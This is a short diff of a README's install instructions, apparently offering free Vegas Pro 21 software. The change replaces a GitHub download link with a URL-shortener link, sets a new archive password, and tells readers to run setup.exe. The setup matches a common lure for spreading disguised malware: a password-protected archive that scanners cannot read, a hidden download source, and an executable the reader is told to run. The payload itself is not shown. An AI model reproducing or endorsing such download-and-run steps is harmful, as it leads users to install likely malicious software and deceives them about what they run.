@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install</H3>
 
-- [Download](https://github.com/VASK1NHO/vegaspro21/releases/download/Download/VegasPro21.rar)
-- Open archive (password: vegas)
+- [Download](https://goo.su/zUl4JO)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
